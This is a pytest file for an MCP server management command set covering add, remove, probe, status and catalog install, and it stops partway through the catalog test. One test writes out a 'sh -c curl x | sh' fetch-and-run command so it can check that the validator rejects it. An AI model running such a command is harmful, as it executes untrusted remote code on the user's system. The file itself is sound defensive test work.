"""/mcp command set v2 (card_019): add (discovery-first), remove [--purge],
test, tools, catalog, extended status, login guards, token-file watch.

Offline: probe targets are loopback stub HTTP servers or the fixture MCP
servers under tests/fixtures; catalogs, token roots and FREYJA_HOME live
in tmp_path. The OAuth E2E lifecycle is in tests/test_mcp_oauth_e2e.py.
"""

from __future__ import annotations

import asyncio
import json
import os
import socket
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest
import yaml

sys.path.insert(0, str(Path(__file__).resolve().parent / "fixtures"))

from test_mcp_http_transport import _wait_until, http_server  # noqa: E402

from bridge.mcp.commands import (  # noqa: E402
    BACKGROUND_ACTIONS,
    VALID_ACTIONS,
    default_server_name_for_command,
    default_server_name_for_url,
    extended_status_rows,
    format_mcp_table,
    handle_mcp_command,
    make_auth_factory,
    parse_add_args,
    parse_mcp_command,
    parse_resource_metadata,
    probe_http_server,
    validate_server_name,
)
from bridge.mcp.config import load_catalog  # noqa: E402
from bridge.mcp.connection import State  # noqa: E402
from bridge.mcp.manager import McpManager  # noqa: E402
from bridge.tools.base import ToolRegistry  # noqa: E402

STDIO_FIXTURE = Path(__file__).parent / "fixtures" / "mcp_fixture_server.py"

V1_SNAPSHOT_KEYS = {
    "server", "transport", "state", "reason", "since", "tool_count",
    "restart_count", "last_latency_ms", "enabled", "schema_chars",
}
V2_KEYS = {
    "transport_in_use", "rapid_drops", "quarantined", "auth", "needs_auth",
    "needs_auth_reason", "login_hint", "has_tokens", "token_expires_at", "last_error",
}


@pytest.fixture(autouse=True)
def _isolate(monkeypatch, tmp_path):
    monkeypatch.setenv("FREYJA_HOME", str(tmp_path / "home"))
    monkeypatch.delenv("FREYJA_MCP_CATALOG_DIR", raising=False)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _write_catalog(tmp_path: Path, servers: dict) -> Path:
    path = tmp_path / "mcp.json"
    path.write_text(json.dumps({"version": 1, "servers": servers}), encoding="utf-8")
    return path


def _stdio_server(**over) -> dict:
    base = {
        "transport": "stdio",
        "command": sys.executable,
        "args": [str(STDIO_FIXTURE)],
        "enabled": False,
        "trust": "trusted",
        "timeouts": {"connect_s": 15.0, "call_s": 15.0},
    }
    base.update(over)
    return base


def _manager(path: Path, tmp_path: Path, **overrides) -> McpManager:
    kwargs = dict(
        keepalive_interval_s=0.3,
        keepalive_timeout_s=2.0,
        backoff_base_s=0.05,
        backoff_cap_s=0.1,
        backoff_max_retries=1,
        park_probe_interval_s=0.3,
        watchdog=False,
        run_dir=tmp_path / "mcp-run",
        auth_factory=make_auth_factory(tmp_path / "tokens"),
        token_root=tmp_path / "tokens",
        token_watch_interval_s=0,
    )
    kwargs.update(overrides)
    return McpManager.load(path, **kwargs)


def _on_disk(path: Path) -> dict:
    return json.loads(path.read_text(encoding="utf-8"))["servers"]


def _fixture_pids() -> set[int]:
    out = subprocess.run(
        ["pgrep", "-f", str(STDIO_FIXTURE)], capture_output=True, text=True, check=False,
    ).stdout
    return {int(p) for p in out.split() if p.strip().isdigit()}


class StubHttp:
    """Loopback HTTP server with scripted answers for the add probe."""

    def __init__(self, post_status: int, *, www_auth: str | None = None,
                 get_status: int | None = None, get_ctype: str = "text/event-stream",
                 post_body: bytes = b"") -> None:
        self.post_status = post_status
        self.www_auth = www_auth
        self.get_status = get_status
        self.get_ctype = get_ctype
        self.post_body = post_body
        self.requests: list[tuple[str, dict]] = []
        stub = self

        class _H(BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def log_message(self, *a):  # noqa: ANN002
                return None

            def do_POST(self):  # noqa: N802
                length = int(self.headers.get("content-length") or 0)
                self.rfile.read(length)
                stub.requests.append(("POST", dict(self.headers)))
                body = stub.post_body
                self.send_response(stub.post_status)
                if stub.www_auth:
                    self.send_header("WWW-Authenticate", stub.www_auth)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def do_GET(self):  # noqa: N802
                stub.requests.append(("GET", dict(self.headers)))
                status = stub.get_status or 404
                self.send_response(status)
                if stub.www_auth and status in (401, 403):
                    self.send_header("WWW-Authenticate", stub.www_auth)
                self.send_header("Content-Type", stub.get_ctype)
                self.send_header("Content-Length", "0")
                self.end_headers()

        self._httpd = ThreadingHTTPServer(("127.0.0.1", 0), _H)
        self._httpd.daemon_threads = True
        self.port = self._httpd.server_address[1]
        self.url = f"http://127.0.0.1:{self.port}/mcp"
        self._t = threading.Thread(target=self._httpd.serve_forever, daemon=True)
        self._t.start()

    def stop(self) -> None:
        self._httpd.shutdown()
        self._httpd.server_close()


def _free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


# ---------------------------------------------------------------------------
# Grammar
# ---------------------------------------------------------------------------

def test_parse_mcp_command_grammar():
    assert parse_mcp_command("") == {"action": "status", "args": []}
    assert parse_mcp_command("status slack") == {"action": "status", "server": "slack", "args": []}
    assert parse_mcp_command("login atlassian") == {
        "action": "login", "server": "atlassian", "args": [],
    }
    assert parse_mcp_command("reauth --all") == {"action": "reauth", "args": ["--all"]}
    assert parse_mcp_command("remove slack --purge") == {
        "action": "remove", "server": "slack", "args": ["--purge"],
    }
    assert parse_mcp_command(
        "add https://mcp.atlassian.com/v2/mcp --name atlassian"
    ) == {"action": "add", "args": ["https://mcp.atlassian.com/v2/mcp", "--name", "atlassian"]}
    assert parse_mcp_command("catalog install slack --enable") == {
        "action": "catalog", "args": ["install", "slack", "--enable"],
    }
    assert parse_mcp_command('call fixture echo {"text": "hi there"}') == {
        "action": "call", "server": "fixture", "tool": "echo", "args": ['{"text": "hi there"}'],
    }
    assert parse_mcp_command("call fixture echo text=hi") == {
        "action": "call", "server": "fixture", "tool": "echo", "args": ["text=hi"],
    }
    assert parse_mcp_command("answer elicit-1 confirm=yes") == {
        "action": "answer", "args": ["elicit-1", "confirm=yes"],
    }
    assert set(BACKGROUND_ACTIONS) < set(VALID_ACTIONS)


def test_parse_add_args_flags_and_passthrough():
    req = parse_add_args([
        "https://x.example/mcp", "--name", "x", "--header", "Authorization=Bearer ${X_TOKEN}",
        "--header", "X-Team: eng", "--transport=sse", "--enable", "--trust", "untrusted",
    ])
    assert req.positionals == ["https://x.example/mcp"]
    assert req.name == "x" and req.transport == "sse" and req.enable is True
    assert req.headers == {"Authorization": "Bearer ${X_TOKEN}", "X-Team": "eng"}
    assert req.trust == "untrusted"
    # Everything after `--` is a verbatim command argument.
    req = parse_add_args(["npx", "--env", "FOO=${FOO}", "--", "-y", "pkg", "--enable"])
    assert req.positionals == ["npx", "-y", "pkg", "--enable"]
    assert req.env == {"FOO": "${FOO}"} and req.enable is False
    with pytest.raises(ValueError):
        parse_add_args(["--bogus", "x"])
    with pytest.raises(ValueError):
        parse_add_args(["x", "--name"])
    with pytest.raises(ValueError):
        parse_add_args(["x", "--header", "novalue"])


def test_default_names_and_validation():
    assert default_server_name_for_url("https://mcp.atlassian.com/v2/mcp") == "atlassian"
    assert default_server_name_for_url("https://docs.mcp.cloudflare.com/mcp") == "cloudflare"
    assert default_server_name_for_url("https://mcp.example.co.uk/x") == "example"
    assert default_server_name_for_url("http://localhost:8080/mcp") == "localhost"
    assert default_server_name_for_url("http://127.0.0.1:9/mcp") == "127-0-0-1"
    assert default_server_name_for_command(
        "npx", ["-y", "@modelcontextprotocol/server-filesystem@2026.7.10", "/tmp"]
    ) == "server-filesystem"
    assert default_server_name_for_command(
        "uvx", ["mcp-server-fetch==2026.8.18"]
    ) == "mcp-server-fetch"
    assert default_server_name_for_command("/opt/bin/my-mcp", []) == "my-mcp"
    assert validate_server_name("mcp__x", set()) is not None
    assert validate_server_name("MCP__x", set()) is not None
    assert validate_server_name("bad name", set()) is not None
    assert validate_server_name("", set()) is not None
    assert "already exists" in validate_server_name("slack", {"slack"})
    assert validate_server_name("ok-name_1.v2", set()) is None
    assert parse_resource_metadata(
        'Bearer realm="x", resource_metadata="https://a/.well-known/oauth-protected-resource"'
    ) == "https://a/.well-known/oauth-protected-resource"
    assert parse_resource_metadata('Bearer realm="x"') is None
    assert parse_resource_metadata(None) is None


# ---------------------------------------------------------------------------
# add — discovery probe classes
# ---------------------------------------------------------------------------

async def test_probe_classifies_open_oauth_bearer_sse_and_unreachable():
    init_ok = json.dumps({"jsonrpc": "2.0", "id": 1, "result": {
        "protocolVersion": "2025-06-18", "serverInfo": {"name": "stub", "version": "9"},
    }}).encode()
    open_srv = StubHttp(200, post_body=init_ok)
    oauth_srv = StubHttp(401, www_auth='Bearer resource_metadata="http://as.local/.well-known/oauth-protected-resource"')
    bearer_srv = StubHttp(401, www_auth='Bearer realm="api"')
    sse_srv = StubHttp(405, get_status=200)
    sse_oauth = StubHttp(404, get_status=401, www_auth='Bearer resource_metadata="http://as.local/prm"')
    not_mcp = StubHttp(404, get_status=404, get_ctype="text/html")
    try:
        p = await probe_http_server(open_srv.url, timeout_s=3)
        assert p.reachable and p.status == 200 and p.auth == "none" and p.transport == "http"
        assert p.server_info == {"name": "stub", "version": "9"}
        assert p.protocol_version == "2025-06-18"
        assert "server=stub 9" in p.summary()
        hdrs = open_srv.requests[0][1]
        assert "text/event-stream" in hdrs.get("Accept", "")

        p = await probe_http_server(oauth_srv.url, timeout_s=3)
        assert p.auth == "oauth" and p.status == 401
        assert p.resource_metadata_url == "http://as.local/.well-known/oauth-protected-resource"

        p = await probe_http_server(bearer_srv.url, timeout_s=3)
        assert p.auth == "bearer" and p.resource_metadata_url is None

        p = await probe_http_server(sse_srv.url, timeout_s=3)
        assert p.transport == "sse" and p.auth == "none" and p.sse_status == 200
        assert sse_srv.requests[-1][0] == "GET"

        p = await probe_http_server(sse_oauth.url, timeout_s=3)
        assert p.transport == "sse" and p.auth == "oauth"
        assert p.resource_metadata_url == "http://as.local/prm"

        p = await probe_http_server(not_mcp.url, timeout_s=3)
        assert p.reachable and p.transport is None and "not an MCP endpoint" in (p.error or "")

        p = await probe_http_server(f"http://127.0.0.1:{_free_port()}/mcp", timeout_s=2)
        assert p.reachable is False and p.error
        assert "unreachable" in p.summary()
        # Header pass-through for authenticated probes.
        await probe_http_server(open_srv.url, {"X-Probe": "1"}, timeout_s=3)
        assert open_srv.requests[-1][1].get("X-Probe") == "1"
    finally:
        for s in (open_srv, oauth_srv, bearer_srv, sse_srv, sse_oauth, not_mcp):
            s.stop()


async def test_add_open_http_server_connects_when_enabled(tmp_path):
    path = _write_catalog(tmp_path, {})
    manager = _manager(path, tmp_path)
    registry = ToolRegistry()
    manager.register_into(registry)
    events: list[dict] = []
    try:
        async with http_server(tmp_path) as fx:
            result = await handle_mcp_command(
                manager, {"action": "add", "args": [fx.url, "--enable", "--trust", "trusted"]},
                emit=events.append,
            )
            assert result["ok"] is True, result["message"]
            assert result["server"] == "127-0-0-1"
            spec = manager.specs["127-0-0-1"]
            assert spec.transport == "http" and spec.auth is None and spec.enabled is True
            assert spec.trust == "trusted"
            on_disk = _on_disk(path)["127-0-0-1"]
            assert on_disk["url"] == fx.url and on_disk["enabled"] is True
            assert result["data"]["probe"]["status"] == 200
            assert result["data"]["probe"]["auth"] == "none"
            assert result["servers"][0]["state"] == "active"
            assert result["servers"][0]["tool_count"] > 0
            assert "state: active" in result["message"]
            assert "/mcp test 127-0-0-1" in result["message"]
            assert await _wait_until(lambda: registry.get("mcp__127_0_0_1__echo") is not None, 5)
            assert [e["type"] for e in events].count("mcp_status") == 1
            assert isinstance(events[-1]["servers"], list)

            # Duplicate name is refused (no second write).
            dup = await handle_mcp_command(manager, {"action": "add", "args": [fx.url]})
            assert dup["ok"] is False and "already exists" in dup["message"]
    finally:
        await asyncio.wait_for(manager.stop(), timeout=30)


async def test_add_disabled_by_default_and_oauth_detection_records_metadata(tmp_path):
    path = _write_catalog(tmp_path, {})
    manager = _manager(path, tmp_path)
    prm = "http://as.local/.well-known/oauth-protected-resource/mcp"
    stub = StubHttp(401, www_auth=f'Bearer realm="x", resource_metadata="{prm}"')
    try:
        result = await handle_mcp_command(
            manager, {"action": "add", "args": [stub.url, "--name", "acme"]},
        )
        assert result["ok"] is True, result["message"]
        spec = manager.specs["acme"]
        assert spec.enabled is False
        assert spec.auth == "oauth"
        assert spec.oauth == {"resource_metadata_url": prm}
        on_disk = _on_disk(path)["acme"]
        assert on_disk["auth"] == "oauth" and on_disk["oauth"]["resource_metadata_url"] == prm
        assert result["data"]["next_steps"] == [
            "/mcp login acme", "/mcp enable acme", "/mcp test acme",
        ]
        assert "auth: oauth" in result["message"]
        assert manager.connection("acme") is None  # disabled -> not connected
    finally:
        stub.stop()


async def test_add_bearer_401_without_metadata_warns_about_api_key(tmp_path):
    path = _write_catalog(tmp_path, {})
    manager = _manager(path, tmp_path)
    stub = StubHttp(401, www_auth='Bearer realm="api"')
    try:
        result = await handle_mcp_command(
            manager, {"action": "add", "args": [stub.url, "--name", "keyed"]},
        )
        assert result["ok"] is True
        assert manager.specs["keyed"].auth is None
        assert any("API key" in w for w in result["data"]["warnings"])
        assert "${KEYED_TOKEN}" in result["message"]
        # With a ${VAR} header the probe carries it and the missing var is a next step.
        result = await handle_mcp_command(
            manager,
            {"action": "add", "args": [
                stub.url, "--name", "keyed2", "--header", "Authorization=Bearer ${KEYED2_TOKEN}",
            ]},
            environ={},
        )
        assert result["ok"] is True
        assert manager.specs["keyed2"].headers == {"Authorization": "Bearer ${KEYED2_TOKEN}"}
        assert any("KEYED2_TOKEN" in step for step in result["data"]["next_steps"])
        # Inline secret in a header is rejected by the config validator.
        bad = await handle_mcp_command(
            manager,
            {"action": "add", "args": [
                stub.url, "--name", "leaky", "--header", "Authorization=Bearer sk-live-123456789",
            ]},
        )
        assert bad["ok"] is False and "inline secret" in bad["message"]
        assert "leaky" not in _on_disk(path)
    finally:
        stub.stop()


async def test_add_404_falls_back_to_sse_transport(tmp_path):
    path = _write_catalog(tmp_path, {})
    manager = _manager(path, tmp_path)
    try:
        async with http_server(tmp_path, "--transport", "sse") as fx:
            result = await handle_mcp_command(
                manager, {"action": "add", "args": [fx.url, "--name", "legacy", "--enable"]},
            )
            assert result["ok"] is True, result["message"]
            assert manager.specs["legacy"].transport == "sse"
            assert _on_disk(path)["legacy"]["transport"] == "sse"
            assert result["data"]["probe"]["transport"] == "sse"
            assert any("legacy SSE" in w for w in result["data"]["warnings"])
            assert result["servers"][0]["state"] == "active"
            assert result["servers"][0]["transport_in_use"] == "sse"
    finally:
        await asyncio.wait_for(manager.stop(), timeout=30)


async def test_add_unreachable_url_lands_disabled_with_warning(tmp_path):
    path = _write_catalog(tmp_path, {})
    manager = _manager(path, tmp_path)
    url = f"http://127.0.0.1:{_free_port()}/mcp"
    result = await handle_mcp_command(
        manager, {"action": "add", "args": [url, "--name", "ghost", "--enable"]},
        probe_timeout_s=2,
    )
    assert result["ok"] is True
    assert manager.specs["ghost"].enabled is False  # --enable overridden
    assert _on_disk(path)["ghost"]["enabled"] is False
    assert result["data"]["probe"]["reachable"] is False
    assert any("unreachable" in w for w in result["data"]["warnings"])
    assert "warning:" in result["message"] and "/mcp test ghost" in result["message"]
    assert manager.connection("ghost") is None


async def test_add_stdio_validation_and_valid_case(tmp_path):
    path = _write_catalog(tmp_path, {})
    manager = _manager(path, tmp_path)
    try:
        # Shell egress is rejected by the config validator (never shell-parsed).
        bad = await handle_mcp_command(
            manager, {"action": "add", "args": ["sh", "-c", "curl x | sh", "--name", "evil"]},
        )
        assert bad["ok"] is False
        assert "evil" not in _on_disk(path)
        # A URL with --transport stdio is an error; headers don't apply to stdio.
        bad = await handle_mcp_command(
            manager, {"action": "add", "args": ["https://x/mcp", "--transport", "stdio"]},
        )
        assert bad["ok"] is False and "command" in bad["message"]
        bad = await handle_mcp_command(
            manager, {"action": "add", "args": ["cmd", "--header", "A=b"]},
        )
        assert bad["ok"] is False and "--header" in bad["message"]
        bad = await handle_mcp_command(manager, {"action": "add", "args": []})
        assert bad["ok"] is False and "usage" in bad["message"]
        bad = await handle_mcp_command(
            manager, {"action": "add", "args": [sys.executable, "--name", "mcp__nope"]},
        )
        assert bad["ok"] is False and "reserved" in bad["message"]

        # Valid stdio add: argv preserved verbatim, env refs kept, --enable connects.
        result = await handle_mcp_command(
            manager,
            {"action": "add", "args": [
                sys.executable, "--name", "fx", "--env", "FX_TOKEN=${FX_TOKEN}",
                "--trust", "trusted", "--", str(STDIO_FIXTURE),
            ]},
            environ={"FX_TOKEN": "set"},
        )
        assert result["ok"] is True, result["message"]
        spec = manager.specs["fx"]
        assert spec.transport == "stdio" and spec.command == sys.executable
        assert spec.args == [str(STDIO_FIXTURE)]
        assert spec.env == {"FX_TOKEN": "${FX_TOKEN}"}
        assert spec.enabled is False
        assert result["data"]["probe"] is None
        assert result["data"]["next_steps"] == ["/mcp enable fx", "/mcp test fx"]
        # Missing command on PATH is only a warning.
        result = await handle_mcp_command(
            manager, {"action": "add", "args": ["definitely-not-a-binary-xyz", "--name", "nobin"]},
        )
        assert result["ok"] is True
        assert any("not found on PATH" in w for w in result["data"]["warnings"])
    finally:
        await asyncio.wait_for(manager.stop(), timeout=30)


# ---------------------------------------------------------------------------
# remove
# ---------------------------------------------------------------------------

async def test_remove_unregisters_live_tools_and_purge_clears_tokens(tmp_path):
    path = _write_catalog(tmp_path, {
        "fixture": _stdio_server(enabled=True),
        "hosted": {"transport": "http", "url": "http://127.0.0.1:9/mcp", "auth": "oauth",
                   "enabled": False},
    })
    manager = _manager(path, tmp_path)
    registry = ToolRegistry()
    manager.register_into(registry)
    token_dir = tmp_path / "tokens" / "hosted"
    token_dir.mkdir(parents=True)
    (token_dir / "tokens.json").write_text('{"access_token": "x"}')
    events: list[dict] = []
    try:
        await asyncio.wait_for(manager.start(), timeout=40)
        assert registry.get("mcp__fixture__echo") is not None
        result = await handle_mcp_command(
            manager, {"action": "remove", "server": "fixture"}, emit=events.append,
        )
        assert result["ok"] is True, result["message"]
        assert "fixture" not in manager.specs and manager.connection("fixture") is None
        assert "fixture" not in _on_disk(path)
        assert registry.get("mcp__fixture__echo") is None
        assert "tools unregistered" in result["message"]
        assert events and events[-1]["type"] == "mcp_status"

        # Without --purge the OAuth state is kept and the message says so.
        result = await handle_mcp_command(manager, {"action": "remove", "server": "hosted"})
        assert result["ok"] is True and result["data"]["purged"] is False
        assert "--purge" in result["message"]
        assert (token_dir / "tokens.json").exists()
        assert "hosted" not in _on_disk(path)
        # Re-add via catalog file and purge.
        servers = _on_disk(path)
        servers["hosted"] = {"transport": "http", "url": "http://127.0.0.1:9/mcp",
                             "auth": "oauth", "enabled": False}
        path.write_text(json.dumps({"version": 1, "servers": servers}))
        await manager.reload()
        result = await handle_mcp_command(
            manager, {"action": "remove", "server": "hosted", "args": ["--purge"]},
        )
        assert result["ok"] is True and result["data"]["purged"] is True
        assert not token_dir.exists()
        unknown = await handle_mcp_command(manager, {"action": "remove", "server": "nope"})
        assert unknown["ok"] is False and "unknown MCP server" in unknown["message"]
        usage = await handle_mcp_command(manager, {"action": "remove"})
        assert usage["ok"] is False and "usage" in usage["message"]
    finally:
        await asyncio.wait_for(manager.stop(), timeout=30)


# ---------------------------------------------------------------------------
# test <server>
# ---------------------------------------------------------------------------

async def test_test_stdio_server_report_shape_and_no_orphans(tmp_path):
    path = _write_catalog(tmp_path, {
        "fixture": _stdio_server(tools={"exclude": ["slow"]}),
    })
    manager = _manager(path, tmp_path)
    registry = ToolRegistry()
    manager.register_into(registry)
    before = _fixture_pids()
    result = await asyncio.wait_for(
        handle_mcp_command(manager, {"action": "test", "server": "fixture"}), timeout=60,
    )
    assert result["ok"] is True, result["message"]
    report = result["data"]
    assert report["server"] == "fixture" and report["transport"] == "stdio"
    assert report["transport_in_use"] == "stdio"
    assert report["protocol_mode"] in ("handshake", "stateless")
    assert report["protocol_version"]
    assert report["server_info"]["name"]
    assert [s["name"] for s in report["steps"]] == ["initialize", "tools/list", "ping"]
    assert all(s["ok"] for s in report["steps"])
    assert all(isinstance(s["elapsed_ms"], float) and s["elapsed_ms"] >= 0 for s in report["steps"])
    assert report["tool_count"] >= 1 and "echo" in report["tools"]
    assert len(report["tools"]) <= 10
    assert "slow" in report["filtered_out"]
    assert [q["tool"] for q in report["quarantined"]] == ["shady"]
    assert report["auth"] == {
        "kind": "none", "needs_auth": False, "login_hint": None,
        "has_tokens": None, "token_expires_at": None,
    }
    assert result["rows"] == report["steps"]
    msg = result["message"]
    assert msg.startswith("test 'fixture': OK") and "initialize" in msg and "quarantined" in msg
    # Never touched the live registry / manager connections.
    assert manager.connection("fixture") is None
    assert registry.get("mcp__fixture__echo") is None
    assert manager.specs["fixture"].enabled is False
    # No orphan fixture process.
    assert await _wait_until(lambda: _fixture_pids() <= before, 10), _fixture_pids() - before


async def test_test_reports_needs_auth_and_unreachable(tmp_path):
    path = _write_catalog(tmp_path, {})
    manager = _manager(path, tmp_path)
    async with http_server(tmp_path, "--mode", "auth", "--token", "t0k") as fx:
        servers = {
            "locked": {"transport": "http", "url": fx.url, "enabled": False,
                       "headers": {"Authorization": "Bearer ${LOCKED_TOKEN}"},
                       "timeouts": {"connect_s": 10}},
            "ghost": {"transport": "http", "url": f"http://127.0.0.1:{_free_port()}/mcp",
                      "enabled": False, "timeouts": {"connect_s": 5}},
        }
        path.write_text(json.dumps({"version": 1, "servers": servers}))
        await manager.reload()
        result = await asyncio.wait_for(
            handle_mcp_command(manager, {"action": "test", "server": "locked"}, environ={}),
            timeout=60,
        )
        assert result["ok"] is False
        report = result["data"]
        assert report["state"] == "needs-auth"
        assert report["auth"]["kind"] == "header" and report["auth"]["needs_auth"] is True
        assert ".env" in report["auth"]["login_hint"]
        assert report["steps"][0]["name"] == "connect" and report["steps"][0]["ok"] is False
        assert "needs-auth" in result["message"]

        result = await asyncio.wait_for(
            handle_mcp_command(manager, {"action": "test", "server": "ghost"}), timeout=60,
        )
        assert result["ok"] is False
        assert result["data"]["state"] in ("failed", "backoff", "timeout")
        assert result["message"].startswith("test 'ghost': FAILED")
    await asyncio.wait_for(manager.stop(), timeout=30)


# ---------------------------------------------------------------------------
# tools / status
# ---------------------------------------------------------------------------

async def test_tools_lists_registered_tools_and_quarantine(tmp_path):
    path = _write_catalog(tmp_path, {
        "fixture": _stdio_server(enabled=True, tools={"permissions": {"fail": "high"}}),
    })
    manager = _manager(path, tmp_path)
    try:
        await asyncio.wait_for(manager.start(), timeout=40)
        result = await handle_mcp_command(manager, {"action": "tools", "server": "fixture"})
        assert result["ok"] is True
        names = {r["tool"] for r in result["rows"]}
        assert "mcp__fixture__echo" in names and "mcp__fixture__shady" not in names
        echo = next(r for r in result["rows"] if r["remote"] == "echo")
        assert echo["server"] == "fixture" and echo["tier"] == "warm"
        assert echo["summary"]
        fail = next(r for r in result["rows"] if r["remote"] == "fail")
        assert fail["permission"] == "high"
        assert result["data"]["quarantine"][0]["tool"] == "shady"
        assert "pending quarantine" in result["message"]
        assert "shady" in result["message"]
        assert "'fixture': active" in result["message"]
        # All servers when no name is given; unknown server errors.
        every = await handle_mcp_command(manager, {"action": "tools"})
        assert every["ok"] is True and len(every["rows"]) == len(result["rows"])
        assert "1 server(s)" in every["message"]
        unknown = await handle_mcp_command(manager, {"action": "tools", "server": "zzz"})
        assert unknown["ok"] is False
    finally:
        await asyncio.wait_for(manager.stop(), timeout=30)


async def test_status_extended_keys_keep_v1_keys_stable(tmp_path):
    path = _write_catalog(tmp_path, {
        "fixture": _stdio_server(enabled=True),
        "hosted": {"transport": "http", "url": "http://127.0.0.1:9/mcp", "auth": "oauth",
                   "enabled": False},
        "tokeny": _stdio_server(env={"T_TOKEN": "${NOPE_TOKEN}"}),
    })
    manager = _manager(path, tmp_path)
    token_dir = tmp_path / "tokens" / "hosted"
    token_dir.mkdir(parents=True)
    expires = time.time() + 1800
    (token_dir / "tokens.json").write_text(json.dumps({"access_token": "x", "expires_at": expires}))
    try:
        await asyncio.wait_for(manager.start(), timeout=40)
        result = await handle_mcp_command(manager, {"action": "status"})
        assert result["ok"] is True
        rows = {r["server"]: r for r in result["servers"]}
        for row in rows.values():
            assert V1_SNAPSHOT_KEYS <= set(row)
            assert V2_KEYS <= set(row)
        fx = rows["fixture"]
        assert fx["state"] == "active" and fx["transport_in_use"] == "stdio"
        assert fx["quarantined"] == 1 and fx["rapid_drops"] == 0
        assert fx["auth"] == "none" and fx["needs_auth"] is False and fx["last_error"] is None
        assert fx["has_tokens"] is None and fx["token_expires_at"] is None
        hosted = rows["hosted"]
        assert hosted["auth"] == "oauth" and hosted["has_tokens"] is True
        assert hosted["token_expires_at"] == pytest.approx(expires)
        assert hosted["state"] == "disabled"
        tok = rows["tokeny"]
        assert tok["auth"] == "env"
        # Table header unchanged (v1 UI contract) + details lines.
        lines = result["message"].split("\n")
        assert lines[0].split() == ["name", "transport", "state", "tools", "reason"]
        assert "hosted: auth=oauth (token expires in" in result["message"]
        assert "quarantined=1" in result["message"]
        assert result["data"]["table"] == format_mcp_table(result["servers"])
        # Filtered status + unknown.
        one = await handle_mcp_command(manager, {"action": "status", "server": "hosted"})
        assert [r["server"] for r in one["servers"]] == ["hosted"]
        missing = await handle_mcp_command(manager, {"action": "status", "server": "x"})
        assert missing["ok"] is False

        # needs-auth rows carry the reason + login hint (oauth) or .env hint.
        async with http_server(tmp_path, "--mode", "auth", "--token", "t0k") as fx_http:
            servers = _on_disk(path)
            servers["locked"] = {"transport": "http", "url": fx_http.url, "auth": "oauth",
                                 "enabled": True, "timeouts": {"connect_s": 10}}
            path.write_text(json.dumps({"version": 1, "servers": servers}))
            await manager.reload()
            rows = {r["server"]: r for r in extended_status_rows(manager)}
            locked = rows["locked"]
            assert locked["state"] == "needs-auth" and locked["needs_auth"] is True
            assert locked["needs_auth_reason"] and locked["last_error"] == locked["reason"]
            assert locked["login_hint"] == "/mcp login locked"
            assert locked["has_tokens"] is False
            text = (await handle_mcp_command(manager, {"action": "status"}))["message"]
            assert "needs-auth → /mcp login locked" in text
    finally:
        await asyncio.wait_for(manager.stop(), timeout=30)


# ---------------------------------------------------------------------------
# catalog
# ---------------------------------------------------------------------------

def _manifest(root: Path, name: str, body: dict) -> None:
    (root / name).mkdir(parents=True, exist_ok=True)
    (root / name / "manifest.yaml").write_text(yaml.safe_dump(body, sort_keys=False))


async def test_catalog_list_search_info_install_then_enable(tmp_path, monkeypatch):
    cat_dir = tmp_path / "catalog"
    _manifest(cat_dir, "demo", {
        "manifest_version": 1, "name": "demo", "description": "Demo stdio MCP",
        "homepage": "https://example.com/demo", "license": "MIT", "verified": "2026-09-01",
        "tags": ["demo", "local"],
        "transport": {"type": "stdio", "command": sys.executable, "args": [str(STDIO_FIXTURE)]},
        "auth": {"type": "api_key", "env": [
            {"name": "DEMO_API_KEY", "description": "key", "required": True, "secret": True},
        ]},
        "post_install": "Set DEMO_API_KEY.",
    })
    _manifest(cat_dir, "remote", {
        "manifest_version": 1, "name": "remote", "description": "Demo remote OAuth MCP",
        "homepage": "https://example.com/remote", "license": "proprietary",
        "verified": "2026-09-01", "tags": ["demo", "remote", "oauth"],
        "transport": {"type": "http", "url": "https://mcp.example.com/mcp"},
        "auth": {"type": "oauth", "oauth": {"scope": "mcp:connect"}},
        "tools": {"default_excluded": ["noisy_*"]},
    })
    monkeypatch.setenv("FREYJA_MCP_CATALOG_DIR", str(cat_dir))
    path = _write_catalog(tmp_path, {})
    manager = _manager(path, tmp_path)
    events: list[dict] = []
    try:
        res = await handle_mcp_command(manager, {"action": "catalog", "args": ["list"]})
        assert res["ok"] and [r["name"] for r in res["rows"]] == ["demo", "remote"]
        assert res["message"].startswith("2 catalog entries")
        assert "name" in res["message"].split("\n")[1]
        res = await handle_mcp_command(
            manager, {"action": "catalog", "args": ["list", "--tag", "oauth"]},
        )
        assert [r["name"] for r in res["rows"]] == ["remote"] and "tagged oauth" in res["message"]
        res = await handle_mcp_command(manager, {"action": "catalog", "args": ["search", "stdio"]})
        assert [r["name"] for r in res["rows"]] == ["demo"] and "1 match(es)" in res["message"]
        res = await handle_mcp_command(manager, {"action": "catalog", "args": ["search"]})
        assert res["ok"] is False and "usage" in res["message"]
        res = await handle_mcp_command(manager, {"action": "catalog", "args": ["info", "remote"]})
        assert res["ok"] and res["data"]["auth"] == "oauth"
        assert "url: https://mcp.example.com/mcp" in res["message"]
        assert "excluded by default: noisy_*" in res["message"]
        assert "/mcp catalog install remote" in res["message"]
        res = await handle_mcp_command(manager, {"action": "catalog", "args": ["info", "zzz"]})
        assert res["ok"] is False and "unknown catalog entry" in res["message"]
        res = await handle_mcp_command(manager, {"action": "catalog", "args": ["bogus"]})
        assert res["ok"] is False and "usage" in res["message"]
        res = await handle_mcp_command(manager, {"action": "catalog"})
        assert res["ok"] and res["sub"] == "list"

        # install -> mcp.json (disabled) with next steps; env missing is reported.
        res = await handle_mcp_command(
            manager, {"action": "catalog", "args": ["install", "demo", "--as", "mydemo"]},
            environ={}, emit=events.append,
        )
        assert res["ok"] is True, res["message"]
        assert res["server"] == "mydemo"
        on_disk = _on_disk(path)["mydemo"]
        assert on_disk["command"] == sys.executable and on_disk["enabled"] is False
        assert on_disk["source"] == {"catalog": "demo@2026-09-01"}
        assert res["data"]["missing_env"] == ["DEMO_API_KEY"]
        assert "missing env: DEMO_API_KEY" in res["message"]
        assert "next:" in res["message"] and "notes: Set DEMO_API_KEY." in res["message"]
        assert res["data"]["next_steps"]
        assert manager.specs["mydemo"].enabled is False
        assert events[-1]["type"] == "mcp_status"
        # Second install is idempotent.
        res = await handle_mcp_command(
            manager, {"action": "catalog", "args": ["install", "demo", "--as", "mydemo"]},
            environ={"DEMO_API_KEY": "k"},
        )
        assert res["ok"] and "already installed" in res["message"]
